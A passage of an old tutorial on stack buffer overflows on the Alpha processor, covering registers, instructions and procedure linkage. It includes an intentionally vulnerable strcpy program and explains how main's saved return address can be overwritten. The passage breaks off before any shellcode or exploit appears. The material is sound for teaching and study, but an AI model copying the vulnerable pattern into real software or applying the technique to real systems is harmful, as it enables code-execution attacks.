@@ -1,0 +1,4956 @@
+NOTE: Wrote this in 2000. Published 2012, for fun.
+----
+---
+--
+-
+
+
+Alpha Stack Based Buffer Overflows
+----------------------------------
+By: Andrew Darqui (adarq.org)
+    - andrew.darqui@gmail
+
+<XX : INDEX>
+
+      [00]   -   Introduction
+      [01]   -   About Alpha
+      [02]   -   Alpha registers
+      [03]   -   Alpha instruction set summary
+      [04]   -   Modifying the return address
+      [05]   -   Writing Alpha shellcode
+      [06]   -   Writing an Alpha exploit
+      [07]   -   References
+      [08]   -   Conclusion
+
+
+<00 : Introduction>
+
+      Most everything has been tested on an `Alpha linux' running redhat.
+      Also, keep in mind: EXPLOITING PROGRAMS ON ALPHA IS DIFFICULT!
+
+      First I will go over the Alpha processor itself. Then I will
+      go over the registers and instructions needed to write the
+      exploits. Next, I will go over how to actually overwrite the
+      return address of a procedure; This section will go over how
+      procedures are linked (prologue/epilogue) as well as how we can
+      overwrite the return address of a procedure. The section that
+      follows will explain my methods of writing shellcode for Alpha.
+      Finally, I will go over some example exploits piece by piece.
+
+
+<01 : About Alpha>
+
+      The Alpha processor is a 64 bit load and store RISC
+      architecture. All registers are 64 bits in width. Although
+      it is 64 bit, each instruction is 32 bits in width.
+      Memory is only accessed with loads and stores, the memory is
+      accessed in little endian byte ordering, BUT, can be changed
+      from little endian to big endian. The Alpha processor is
+      little endian by `default'. Although you can access memory
+      in little or big endian, the instruction stream is *always*
+      accessed in little endian byte ordering (which brings us too
+      our default above :). All data manipulation such as; adding
+      and subtracting, is done with the 64 bit registers. The stack
+      on the Alpha grows towards lesser memory addresses, which is
+      very important to know.
+
+      The Alpha processor comes with a PALcode (Privileged
+      Architecture Library) which is a privileged software library.
+      Operating systems define the PALcode, so PALcode is specific
+      to the OS. I'm not going much into detail in this paper about
+      the PALcode library, this is because really, we are only
+      interested in one PALcode:
+
+      callsys *or*
+      CALL_PAL callsys
+
+      This will initiate a syscall. I will speak of this later.
+
+      Here I will go over some endian information. On a BIG ENDIAN
+      system; within a multi-byte integer (short,int,long,double), the
+      byte with the smallest address is most significant; a byte's
+      significance decreases as its address increases. On a LITTLE ENDIAN
+      system; within a multi-byte integer (short,int,long,double), the
+      byte with the smallest address is least significant; a byte's
+      significance increases as its address increases. Look at the
+      diagrams below.
+
+Endian Diagram (16bit) : Using 0x1234
+-------------------------------------
+
+Little Endian:
+       .-----------.
+Low Addr| 0x34 0x12 |High Addr
+       `-----------'
+
+Big Endian:
+       .-----------.
+Low Addr| 0x12 0x34 |High Addr
+       `-----------'
+
+Endian Diagram (32bit) : Using 0x12345678
+-----------------------------------------
+
+Little Endian:
+       .---------------------.
+Low Addr| 0x78 0x56 0x34 0x12 |High Addr
+       `---------------------'
+
+Big Endian:
+       .---------------------.
+Low Addr| 0x12 0x34 0x56 0x78 |High Addr
+       `---------------------'
+
+Endian Diagram (64bit) : Using 0x112233445667788
+-------------------------------------------------
+
+Little Endian:
+       .-----------------------------------------.
+Low Addr| 0x88 0x77 0x66 0x55 0x44 0x33 0x22 0x11 |High Addr
+       `-----------------------------------------'
+
+Big Endian:
+       .-----------------------------------------.
+Low Addr| 0x11 0x22 0x33 0x44 0x55 0x66 0x77 0x88 |High Addr
+       `-----------------------------------------'
+
+There aren't many different types of instructions, this is
+RISC after all. This is how the instructions are classified:
+
+Branch Instructions       - There are unconditional and conditional branch instructions.
+PALcode Instructions      - Those used by the PALcode Library
+Load & Store Instructions - Move bytes, word, longwords, quadwords between memory and registers.
+Operate Instructions      - FPU instructions, arithmetic instructions and such.
+
+             Alpha data addressing:
+
+             byte        -   08   bits
+             word        -   16   bits
+             longword    -   32   bits
+             quadword    -   64   bits
+
+
+<02 : Alpha registers>
+
+      There are many registers in the Alpha processor. We have 
+      32 integer registers (r0-r31) and 32 floating
+      point registers (f0-f31); both of which are 64 bits wide.
+      We will focus on the 32 integer registers. There are some
+      special control registers such as the Program Counter as well.
+
+*** Taken from 'info all-registers' in gdb ***
+v0             0x0      0
+t0             0x120000000      4831838208
+t1             0x1200007f0      4831840240
+t2             0x4141414141414141       4702111234474983745
+t3             0x4141414141414141       4702111234474983745
+t4             0x1      1
+t5             0x0      0
+t6             0x3      3
+t7             0x7      7
+s0             0x1      1
+s1             0x11ffffc68      4831837288
+s2             0x11ffffc78      4831837304
+s3             0x120184fa8      4833431464
+s4             0x168    360
+s5             0x12017cb88      4833397640
+fp             0x11ffffc50      4831837264
+a0             0x11ffffc10      4831837200
+a1             0x120100e30      4832890416
+a2             0x3a     58
+a3             0x0      0
+a4             0x2      2
+a5             0x200002d8e00    2199026241024
+t8             0x4      4
+t9             0x20000172474    2199024772212
+t10            0xfffffc0000310b18       -4398043297000
+t11            0xfffffc0003d90000       -4397981958144
+ra             0x1200007f0      4831840240
+t12            0x20000176d70    2199024790896
+at             0x0      0
+gp             0x2000027f198    2199025873304
+sp             0x11ffffc50      4831837264
+zero           0x0      0
+f0             1000000 (raw 0x412e848000000000)
+f1             1.0864618773533056e-311 (raw 0x0000020000010000)
+f2             2.3872448458682637e-314 (raw 0x000000011ffffcb0)
+f3             0        (raw 0x0000000000000000)
+f4             0        (raw 0x0000000000000000)
+f5             0        (raw 0x0000000000000000)
+f6             0        (raw 0x0000000000000000)
+f7             0        (raw 0x0000000000000000)
+f8             0        (raw 0x0000000000000000)
+f9             0        (raw 0x0000000000000000)
+f10            1.6859019490051309e+69   (raw 0x4e4f444c4f482021)
+f11            1.0864618773533056e-311 (raw 0x0000020000010000)
+f12            -1.6729754410616407e-118 (raw 0xa77b0010a43b0018)
+f13             0        (raw 0x0000000000000000)
+f14             0        (raw 0x0000000000000000)
+f15             0        (raw 0x0000000000000000)
+f16             0        (raw 0x0000000000000000)
+f17             0        (raw 0x0000000000000000)
+f18             0        (raw 0x0000000000000000)
+f19             0        (raw 0x0000000000000000)
+f20             0        (raw 0x0000000000000000)
+f21             0        (raw 0x0000000000000000)
+f22             0        (raw 0x0000000000000000)
+f23             0        (raw 0x0000000000000000)
+f24             0        (raw 0x0000000000000000)
+f25             0        (raw 0x0000000000000000)
+f26             0        (raw 0x0000000000000000)
+f27             0        (raw 0x0000000000000000)
+f28             0        (raw 0x0000000000000000)
+f29             0        (raw 0x0000000000000000)
+f30             0        (raw 0x0000000000000000)
+f31             3.7857669957336791e-270 (raw 0x0800000000000000)
+pc              0x120000808      4831840264
+vfp             0x11ffffc60      4831837280
+
+      The above diagram shows the integer registers (r0-r31), the floating
+      point registers (f0-f31), and two special registers (pc and vfp).
+      The first 32 registers are the integer registers. Register v0
+      through register zero are numbered sequentially. That is, register
+      v0 is r0 and register zero is r31.
+
+      Usually when writing shellcode etc on Alpha you use the registers
+      by their number ($31). This is a little m4 script which makes it
+      a lot easier for you:
+
++BEGIN alpha_m4
+
+define(v0,0) define(t0,1) define(t1,2) define(t2,3) define(t3,4) define(t4,5) define(t5,6)
+define(t6,7) define(t7,8) define(s0,9) define(s1,10) define(s2,11) define(s3,12) define(s4,13)
+define(s5,14) define(fp,15) define(a0,16) define(a1,17) define(a2,18) define(a3,19)
+define(a4,20) define(a5,21) define(t8,22) define(t9,23) define(t10,24) define(t11,25)
+define(ra,26) define(t12,27) define(at,28) define(gp,29) define(sp,30) define(zero,31)
+define(pc,32) define(vfp,33)
+
++END alpha_m4
+
+      The register which controls execution / program flow is the
+      Program Counter (pc or register 32 (r32)). This control register
+      references the next sequential instruction in the instruction
+      stream, also referred to as the `updated pc'. It is important to
+      know that this register cannot be altered directly, it can only
+      be altered indirectly (by a branch instruction etc).
+
+      The register named `zero', or register 31, is RaZ (Read as Zero).
+      Writes to this register have no effect. This register is good
+      for storing zero's / NULL's, in our shellcode.
+
+      Register v0 or register 0 is typically used for return values
+      from procedures. It is also used for syscalls, meaning, we
+      stick our syscall number in this register then initiate the trap
+      to the kernel with the `callsys' instruction.
+
+      Registers a0 through a5 are typically used for storing arguments
+      to procedures. We also use these registers as arguments to system
+      calls.
+
+      Registers t0 through t11 are typically used as temporary registers.
+
+      Registers s0 through s5 are typically used as subroutine registers.
+
+      Register ra or register 26 holds return addresses.
+
+      Register sp or register 30 is used as the stack pointer.
+
+      Register fp or register 15 is used as the frame pointer.
+
+
+
+<03 : Alpha instruction set summary>
+
+      In this section I will briefly go over the Alpha instruction set.
+
+      Syntax:
+      opcode <BLAH>                : Check below for syntax of operands
+
+      <registerBLAH>               : This operand is a register (r0-r31)
+
+      <displacement(registerBLAH)> : This is usually used in loads
+                                      and stores. This might look like this:
+                                      0($26) or -666($26). This takes a
+                                      displacement and adds it to the address
+                                      in registerBLAH.
+
+      <(registerBLAH)>             : Uses the address stored in registerBLAH
+
+       <displacement>                  : This is most used in branch
+                                         instructions. It is just a number
+                                         such as '4'. This number is then
+                                         multiplied by the instruction size
+                                         (longword).
+
+      <immediate>                  : An immediate value such as using 999 or 238431240 etc.
+
+      See the end of this section for some added information.
+
+---------------------
+* Load instructions *
+---------------------
+
+lda <registerA>, <displacement(registerB)>
+
+       LOAD ADDRESS
+       Writes a full quadword address from memory registerB+displacement to registerA
+
+ldah <registerA>, <displacement(registerB)>
+
+       LOAD ADDRESS HIGH
+       Writes a full quadword address from memory
+       registerB+(displacement * 65536) to registerA
+
+ldX <registerA>, <displacement(registerB)>
+        These load instructions write a quad/long/word/byte value from
+        memory specified by registerB+displacement into registerA
+
+ldq     LOAD QUADWORD
+
+ldl     LOAD LONGWORD
+
+ldbu    LOAD A ZERO-EXTENDED BYTE
+
+ldwu    LOAD A ZERO-EXTENDED WORD
+
+ldq_u   LOAD UNALIGNED QUADWORD
+
+----------------------
+* Store instructions *
+----------------------
+
+stX <registerA>, <displacement(registerB)>
+
+        These instructions write a quad/long/word/byte value from
+        registerA to the memory specified by registerB+displacement
+
+stq     STORE QUADWORD
+
+stl     STORE LONGWORD
+
+stw     STORE WORD
+
+stb     STORE BYTE
+
+stq_u   STORE UNALIGNED QUADWORD
+
+---------------------------------------
+* Special LOAD and STORE instructions *
+---------------------------------------
+
+ldl_l <registerA>, <displacement(registerB)>
+
+        LOAD LONGWORD LOCKED
+
+ldq_l <registerA>, <displacement(registerB)>
+
+        LOAD QUADWORD LOCKED
+
+stl_c <registerA>, <displacement(registerB)>
+
+        STORE LONGWORD CONDITIONAL
+
+stl_q <registerA>, <displacement(registerB)>
+
+        STORE QUADWORD CONDITIONAL
+
+-----------------------------------
+* Conditional branch instructions *
+-----------------------------------
+
+bxx <registerA>, displacement
+
+        The condition is tested against registerA, if the condition
+        is true, the PC is loaded with the virtual address which is
+        calculated by the PC relative displacement. If the condition
+        is not true, execution resumes at the next instruction.
+
+beq      BRANCH if registerA = ZERO
+
+bge      BRANCH if registerA >= ZERO
+
+bgt      BRANCH if registerA > ZERO
+
+blbc     BRANCH if low bit CLEAR
+
+blbs     BRANCH if low bit SET
+
+ble      BRNACH if registerA <= ZERO
+
+blt      BRANCH if registerA < ZERO
+
+bne      BRANCH if registerA != ZERO
+
+--------------------------------
+* Procedure branches and jumps *
+--------------------------------
+
+br    <registerA>, <displacement>
+
+         The updated PC is written to registerA, then the PC is loaded
+         with the target address, in this case, a displacement, this works
+         in a PC relative manner.
+
+bsr <registerA>, <displacement>
+
+         The update PC is written to registerA, then the PC is loaded
+         with the target address, in this case, a displacement, this
+         works in a PC relative manner. Usually the alpha will save the
+         previous ret on the stack prior to branching to a sub routine.
+
+NOTE: As my Alpha doc says, br and bsr differ only in "hints to possible
+        branch prediction logic. BSR is interpreted as a subroutine call,
+        where the return address is pushed onto a branch prediction stack.
+        BR is just predicted as a branch, no push."
+
+jmp <registerA>, <(registerB)>, hint
+
+jsr <registerA>, <(registerB)>, hint
+
+ret <registerA>, <(registerB)>, hint
+
+jmp_coroutine <registerA>, <(registerB)>, hint
+
+         These are all mnemonics, the hint specifies how the mnemonic
+         is interpreted. Hint bits are 15:14
+         00 JMP
+         01 JSR PUSH
+         10 RET POP
+         11 JMP_COROUTINE POP, PUSH PC
+
+---------------------------
+* Arithmetic instructions *
+---------------------------
+
+addX <registerA>, <registerB or immediate>, <registerC>
+
+         Add registerA to registerB or to a constant, place the result into registerC
+
+addl     ADD LONGWORD
+addq     ADD QUADWORD
+
+cmpXX <registerA>, <registerB or immediate>, <registerC>
+
+         Compare registerA to registerB or to an immediate value, if
+         the result is true, 1 is placed in registerC, otherwise, it
+         will be false, and 0 will be placed in registerC
+
+cmpeq    COMPARE SIGNED QUADWORD EQUAL
+
+cmple    COMPARE SIGNED QUADWORD LESS THAN OR EQUAL
+
+cmplt    COMPARE SIGNED QUADWORD LESS THAN
+
+cmpule   COMPARED UNSIGNED QUADWORD LESS THEN OR EQUAL
+
+cmpult   COMPARED UNSIGNED QUADWORD LESS THAN
+
+mulX <registerA>, <registerB or immediate>, <registerC>
+
+         Multiply registerA by registerB or by an immediate value, store the result in registerC
+
+mull     MULTIPLY LONGWORD
+
+mulq     MULTIPLY QUADWORD
+
+subX <registerA>, <registerB or immediate>, <registerC>
+
+         Subtract registerB or an immediate from registerA and store the difference in registerC
+
+subl     SUBTRACT LONGWORD
+
+subq     SUBTRACT QUADWORD
+
+----------------------------------
+* Logical and shift instructions *
+----------------------------------
+
+mnemonic <registerA>, <registerB or immediate>, <registerC>
+
+         These instructions perform the designated boolean function
+         between registerA and registerB or an immediate, the result
+         is stored in registerC
+
+and      LOGICAL PRODUCT
+
+bic      LOGICAL PRODUCT WITH COMPLIMENT
+
+bis      LOGICAL SUM (OR)
+
+eqv      LOGICAL EQUIVILANCE (XORNOT)
+
+ornot    LOGICAL SUM WITH COMPLIMENT
+
+xor      LOGICAL DIFFERENCE
+
+sxl <registerA>, <registerB or immediate>, <registerC>
+
+         Shift registerA left or right, 0-63 bits by the count in
+         registerB or by a immediate value, the result is written
+         to registerC
+
+sll      SHIFT LEFT LOGICAL
+
+srl      SHIFT RIGHT LOGICAL
+
+---------------------
+* Conditional mov's *
+---------------------
+
+cmovCC <registerA>, <registerB or immediate>, <registerC>
+
+         registerA is tested for a certain condition, if the result
+         is true, registerB or an immediate is written to registerC
+
+cmoveq   MOVE if registerA = 0
+
+cmovge   MOVE if registerA >= 0
+
+cmovgt   MOVE if registerA > 0
+
+cmovlbc MOVE if registerA low bit clear
+
+cmovlbs MOVE if registerA low bit set
+
+cmovle   MOVE if registerA <= 0
+
+cmovlt   MOVE if registerA < 0
+
+cmovne   MOVE if registerA != 0
+
+----------------------------------
+* Byte manipulation instructions *
+----------------------------------
+
+extXX <registerA>, <registerB or immediate>, <registerC>
+
+         Shift registerA left by registerB and
+         extract 1,2,4,8 byte(s) into registerC
+
+extbl    EXTRACT BYTE LOW
+
+extwl    EXTRACT WORD LOW
+
+extll    EXTRACT LONGWORD LOW
+
+extql    EXTRACT QUADWORD LOW
+
+extwh    EXTRACT WORD HIGH
+
+extlh    EXTRACT LONGWORD HIGH
+
+extqh    EXTRACT QUADWORD HIGH
+
+insXX <registerA>, <registerB or immediate>, <registerC>
+
+insbl    INSERT BYTE LOW
+
+inswl    INSERT WORD LOW
+
+insll    INSERT LONGWORD LOW
+
+insql    INSET QUADWORD LOW
+inswh    INSERT WORD HIGH
+
+inslh    INSERT LONGWORD HIGH
+
+insqh    INSERT QUADWORD HIGH
+
+zap <registerA>, <registerB or immediate>, <registerC>
+
+         Select bytes of registerA to zero based on registerB or based
+         on an immediate value, and store the result in registerC
+
+-----------------------------------------------------------------------
+
+        I refer to this small instruction set overview a ton, it should
+        help you out. Whether it is looking through debugger output
+        or writing shellcode, you should be very familiar with the:
+        load and store instructions (not the special ones, those are
+        for multiproc etc), conditional branch instructions, procedure
+        branches and jump instructions, arithmetic instructions, and
+        the conditional move instructions.
+
+        This is real important, since the instructions themselves are
+        32 bits wide, we can't place 32 bit immediate values in registers.
+        Refer back to the bis instruction, this will help get your
+        32 bit values into registers.
+
+
+<04 : Modifying the return address>
+
+        Here we have a small vulnerable program called `stack.c'. We want
+        to make this program somehow return into 0x4142434445464748. Here
+        is stack.c:
+
++BEGIN stack.c
+
+#include <stdio.h>
+#include <string.h>
+
+
+int
+foo(char *str)
+{
+    char              buff[12];
+
+
+    strcpy(buff, str);
+
+    return;
+}
+
+int
+main(int argc, char *argv[])
+{
+
+
+    foo(argv[1]);
+}
+
++END stack.c
+
+        We are going to compile this without optimizations: gcc stack.c
+
+[andrew_darqui@blah]$ gdb ./a.out
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disass main
+Dump of assembler code for function main:
+0x120000460 <main>:     ldah    gp,17(t12)
+0x120000464 <main+4>:   lda     gp,-32416(gp)
+0x120000468 <main+8>:   subq    sp,0x20,sp
+0x12000046c <main+12>: stq      ra,0(sp)
+0x120000470 <main+16>: stq      fp,8(sp)
+0x120000474 <main+20>: mov      sp,fp
+0x120000478 <main+24>: mov      a0,t0
+0x12000047c <main+28>: stq      a1,24(fp)
+0x120000480 <main+32>: stl      t0,16(fp)
+0x120000484 <main+36>: ldq      t1,24(fp)
+0x120000488 <main+40>: addq     t1,0x8,t0
+0x12000048c <main+44>: ldq      a0,0(t0)
+0x120000490 <main+48>: bsr      ra,0x120000408 <foo+8>
+0x120000494 <main+52>: mov      fp,sp
+0x120000498 <main+56>: ldq      ra,0(sp)
+0x12000049c <main+60>: ldq      fp,8(sp)
+0x1200004a0 <main+64>: addq     sp,0x20,sp
+0x1200004a4 <main+68>: ret      zero,(ra),0x1
+End of assembler dump.
+(gdb) disass foo
+Dump of assembler code for function foo:
+0x120000400 <foo>:      ldah    gp,17(t12)
+0x120000404 <foo+4>:    lda     gp,-32320(gp)
+0x120000408 <foo+8>:    subq    sp,0x30,sp
+0x12000040c <foo+12>:   stq     ra,0(sp)
+0x120000410 <foo+16>:   stq     fp,8(sp)
+0x120000414 <foo+20>:   mov     sp,fp
+0x120000418 <foo+24>:   stq     a0,16(fp)
+0x12000041c <foo+28>:   addq    fp,0x18,t0
+0x120000420 <foo+32>:   mov     t0,a0
+0x120000424 <foo+36>:   ldq     a1,16(fp)
+0x120000428 <foo+40>:   ldq     t12,-32728(gp)
+0x12000042c <foo+44>:   jsr     ra,(t12),0x1200005b4
+0x120000430 <foo+48>:   ldah    gp,17(ra)
+0x120000434 <foo+52>:   lda     gp,-32368(gp)
+0x120000438 <foo+56>:   br      0x12000043c <foo+60>
+0x12000043c <foo+60>:   mov     fp,sp
+0x120000440 <foo+64>:   ldq     ra,0(sp)
+0x120000444 <foo+68>:   ldq     fp,8(sp)
+0x120000448 <foo+72>:   addq    sp,0x30,sp
+0x12000044c <foo+76>:   ret     zero,(ra),0x1
+End of assembler dump.
+
+      Ok, before we go on, we *must* understand the procedure linkage
+      of main() and foo().
+
+      On Alpha, when a procedure is setup (procedure prologue), we will
+      often see this:
+
+0x120000468 <main+8>:    subq   sp,0x20,sp
+0x12000046c <main+12>:   stq    ra,0(sp)
+0x120000470 <main+16>:     stq    fp,8(sp)
+0x120000474 <main+20>:     mov    sp,fp
+
+      note:
+      The stack on the Alpha grows towards lesser memory addresses. We
+      subtract from the stack (subq sp,0x20,sp) when we want to make
+      space on our stack for local variables and procedure linkage
+      information, this subtraction will grow our stack towards lesser
+      memory addresses. When we want to cleanup the stack, aka, restore
+      it to the state before we subtracted local variables and procedure
+      linkage information from it, we add how many bytes we subtracted
+      from the stack. This will grow our stack towards higher memory
+      addresses.
+
+      subq sp,0x20,sp
+      Upon prologue, a procedure will subtract enough quadwords to
+      store local variables. Procedure prologue must also subtract
+      enough for TWO quadwords (16 bytes) from the stack. So this
+      instruction is subtracting 32 bytes from sp, and storing the
+      new address in sp.
+
+      stq ra,0(sp)
+      In the prologue, Alpha will save the return address onto the stack.
+      The return address is often found in register 'ra' or r26. This
+      return address is the updated pc of main()'s caller, in this case.
+      As mentioned above in the instruction set reference, when we
+      want to branch to a sub routine, we will use bsr. bsr stores the
+      updated pc into a register (usually the return address register
+      which is register ra or r26), bsr will then branch to the subroutine,
+      and we then will see this prologue we are going over. So this
+      instruction store's the return address at the first quadword
+      in our stack 0(sp).
+
+      stq fp,8(sp)
+      In the prologue, Alpha will save the frame pointer (fp) onto the
+      stack as well. This saved frame pointer is now located at the
+      second quadword on our stack 8(sp). So now we have filled our two
+      quadwords with a return address and a frame pointer.
+
+      mov sp,fp
+      We now make our own frame pointer, to access local variables and
+      such.
+
+      We can access the saved return address and saved fp like so:
+
+               0(fp) <- saved return address
+
+               8(fp) <- saved frame pointer
+
+      When a procedure is returning to its caller, it will usually issue
+      a ret instruction. But, the procedure must do some work to return
+      to its caller without any problems. So here is our generic Alpha
+      procedure epilogue:
+
+0x120000494   <main+52>:   mov    fp,sp
+0x120000498   <main+56>:   ldq    ra,0(sp)
+0x12000049c   <main+60>:   ldq    fp,8(sp)
+0x1200004a0   <main+64>:   addq   sp,0x20,sp
+0x1200004a4   <main+68>:   ret    zero,(ra),0x1
+
+      mov fp,sp
+      We restore the stack pointer.
+      ldq ra,0(sp)
+      As mentioned way above in the procedure prologue, we store the
+      return address into the first quadword of sp. Now, since we are
+      in epilogue, we must restore the return address, so we fetch the
+      return address from the first quadword on the stack, and load it
+      into register ra.
+
+      ldq fp,8(sp)
+      We also stored the frame pointer of our caller onto the stack in
+      the procedure prologue, so we must restore this as well. The saved
+      frame pointer is located on the second quadword of sp. We load the
+      saved frame pointer into fp. Now our caller will have no problems
+      accessing local variables and procedure state information.
+
+      addq sp,0x20,sp
+      Well, we subtracted 0x20 from sp in procedure prologue, now we must
+      add it back.
+
+      ret zero,(ra),0x1
+      Here is the instruction which branches to the address stored in
+      the ra register. On a ret instruction, the first operand is usually
+      register zero, this is because we don't need to save the updated pc
+      anywhere, so we store it to register zero and writes are ignored. Note
+      that the return address (address in register ra) is usually that of
+      an instruction which follows the bsr to the procedure we are in.
+
+             PROLOGUE:
+             0x120000468   <main+8>:    subq   sp,BYTES,sp
+             0x12000046c   <main+12>:   stq    ra,0(sp)
+             0x120000470   <main+16>:   stq    fp,8(sp)
+             0x120000474   <main+20>:   mov    sp,fp
+             ...
+             EPILOGUE:
+             0x120000494   <main+52>:   mov    fp,sp
+             0x120000498   <main+56>:   ldq    ra,0(sp)
+             0x12000049c   <main+60>:   ldq    fp,8(sp)
+             0x1200004a0   <main+64>:   addq   sp,BYTES,sp
+             0x1200004a4   <main+68>:   ret    zero,(ra),0x1
+
+      Lets step aside from overwriting the ret, and see what the
+      stack looks like when moving from func1() to func2(). We won't
+      be subtracting space for local vars or passing arguments etc,
+      this will just give you a feel for procedure linkage.
+
+*NOTE*
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S stuff                      S <- one quadword
+S----------------------------S
+S stuff                      S <- one quadword
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+This is a visual representation of the stack. Each element (stuff) is one
+quadword. The top is a higher memory address, and the bottom is a lower
+memory address (our stack grows downward to lesser memory addresses).
+*END NOTE*
+func1()'s frame after procedure prologue:
+-----------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S saved fp                   S stq fp,8(sp)
+S----------------------------S
+S saved ra                   S stq ra,0(sp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      func1 will now bsr $ra, func2
+
+func2()'s frame after subq sp,0x10,sp (0x10 = 16 : two quadwords):
+------------------------------------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S func1's saved fp           S
+S----------------------------S
+S func1's saved ra           S
+S----------------------------S +---+ *NEW* frame
+S (unused)                   S
+S----------------------------S
+S (unused)                   S
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+func2() does a stq ra,0(sp):
+----------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S func1's saved fp           S
+S----------------------------S
+S func1's saved ra           S
+S----------------------------S +---+ *NEW* frame
+S (unused)                   S
+S----------------------------S
+S saved ra                   S <------
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+func2() does a stq fp, 8(sp):
+-----------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S func1's saved fp           S
+S----------------------------S
+S func1's saved ra           S
+S----------------------------S
+S saved fp                   S <------
+S----------------------------S
+S saved ra                   S
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      Ok, we then do a mov sp,fp and all kinds of other stuff, but now
+      we want to return to func1, so we must execute our procedure epilogue.
+
+stack after addq sp,0x20,sp (note ra and fp have been restored with ldq's):
+---------------------------------------------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S func1's saved fp           S
+S----------------------------S
+S func1's saved ra           S
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      After the ret instruction we will return execution where func1()
+      left off (the instruction following the bsr to func2()).
+
+      Ok, back to the matter at hand. We want to somehow overflow the
+      `buf' array in foo(), and then somehow make the program try to
+      return to 0x4142434445464748.
+
+      Remember how the saved ra was placed into 0(sp), and then the
+      saved fp was placed into 8(sp) ? There were no local variables
+      or arrays etc in our previous example, that showed you how procedure
+      linkage works. Now lets check out foo() and the stack.
+
+stack after foo() does a procedure prologue:
+0x120000408 <foo+8>:    subq    sp,0x30,sp
+0x12000040c <foo+12>:   stq     ra,0(sp)
+0x120000410 <foo+16>:   stq     fp,8(sp)
+0x120000414 <foo+20>:   mov     sp,fp
+-------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S
+S----------------------------S
+S local                      S
+S----------------------------S
+S main's saved fp            S
+S----------------------------S   <- main's frame
+S main's saved ra            S
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::   v- foo()'s frame
+S----------------------------S
+S local padding              S
+S----------------------------S
+S buffer                     S   <- second quadword
+S----------------------------S
+S buffer                     S   <- first quadword
+S----------------------------S
+S local temporary            S
+S----------------------------S
+S saved fp                   S   stq fp,8(sp)
+S----------------------------S
+S saved ra                   S   stq ra,0(sp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      *** NOTE ***
+      Our local buffer is 12 bytes, but when compiled, is 16 bytes. This
+      is because Alpha aligns on quadword boundary. So a buffer that is 5
+      would be 8 on our stack. ETCetc. (see aalign() later on)
+      *** END NOTE ***
+
+      Notice how in both instances, the 2 quadwords of local storage
+      are _above_ the saved fp and saved ra in stack memory. As you
+      will come to see, we can't overwrite foo()'s return address, this
+      is because, you start at the bottom of buffer, which is ABOVE the
+      saved fp and saved ra. You can though, modify main's saved return
+      address, which is above our buffer (of 2 quads). With that in mind,
+      let's go through the entire process :) If you are unfamiliar with
+      anything up to this point please re-read what I typed.
+
+      Compile stack.c:
+
+$ gcc stack.c
+^^^ Now we should have ./a.out ^^^
+
+      Ok, now lets load it up in gdb and put a breakpoint just after the
+      procedure prologue (where we mov sp,fp).
+
+$ gdb ./a.out
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disass main
+Dump of assembler code for function main:
+0x120000460 <main>:     ldah    gp,17(t12)
+0x120000464 <main+4>:   lda     gp,-32416(gp)
+0x120000468 <main+8>:   subq    sp,0x20,sp
+0x12000046c <main+12>: stq      ra,0(sp)
+0x120000470 <main+16>: stq      fp,8(sp)
+0x120000474 <main+20>: mov      sp,fp
+0x120000478 <main+24>: mov      a0,t0
+0x12000047c <main+28>: stq      a1,24(fp)
+0x120000480 <main+32>: stl      t0,16(fp)
+0x120000484 <main+36>: ldq      t1,24(fp)
+0x120000488 <main+40>: addq     t1,0x8,t0
+0x12000048c <main+44>: ldq      a0,0(t0)
+0x120000490 <main+48>: bsr      ra,0x120000408 <foo+8>
+0x120000494 <main+52>: mov      fp,sp
+0x120000498 <main+56>: ldq      ra,0(sp)
+0x12000049c <main+60>: ldq      fp,8(sp)
+0x1200004a0 <main+64>: addq     sp,0x20,sp
+0x1200004a4 <main+68>: ret      zero,(ra),0x1
+End of assembler dump.
+(gdb) disass foo
+Dump of assembler code for function foo:
+0x120000400 <foo>:      ldah    gp,17(t12)
+0x120000404 <foo+4>:    lda     gp,-32320(gp)
+0x120000408 <foo+8>:    subq    sp,0x30,sp
+0x12000040c <foo+12>:   stq     ra,0(sp)
+0x120000410 <foo+16>:   stq     fp,8(sp)
+0x120000414 <foo+20>:   mov     sp,fp
+0x120000418 <foo+24>:   stq     a0,16(fp)
+0x12000041c <foo+28>:   addq    fp,0x18,t0
+0x120000420 <foo+32>:   mov     t0,a0
+0x120000424 <foo+36>:   ldq     a1,16(fp)
+0x120000428 <foo+40>:   ldq     t12,-32728(gp)
+0x12000042c <foo+44>:   jsr     ra,(t12),0x1200005b4
+0x120000430 <foo+48>:   ldah    gp,17(ra)
+0x120000434 <foo+52>:   lda     gp,-32368(gp)
+0x120000438 <foo+56>:   br      0x12000043c <foo+60>
+0x12000043c <foo+60>:   mov     fp,sp
